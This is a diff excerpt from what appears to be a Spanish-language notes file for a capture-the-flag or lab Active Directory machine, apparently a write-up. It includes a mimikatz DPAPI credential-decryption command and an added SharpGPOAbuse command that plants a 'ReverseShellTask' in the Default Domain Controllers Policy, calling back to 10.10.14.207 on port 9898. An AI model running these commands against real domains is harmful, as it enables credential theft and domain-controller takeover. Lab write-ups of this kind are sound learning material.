@@ -373,10 +373,16 @@ dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF
 `GPO`
 ![[Pasted image 20240404221749.png]]
 
-
+``cambiando politicas del Domain Controllers`
 ![[Pasted image 20240404222037.png]]
+
 
 ![[Pasted image 20240404223332.png]]
 
+```python
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "ReverseShellTask" --Author "OFFICE\Administrator" --Command "C:\Windows\Temp\gpo\binary.exe" --Arguments "10.10.14.207 9898" --GPOName "Default Domain Controllers Policy"
+```
 
 ![[Pasted image 20240404225246.png]]
+
+### WE ARE ROOT
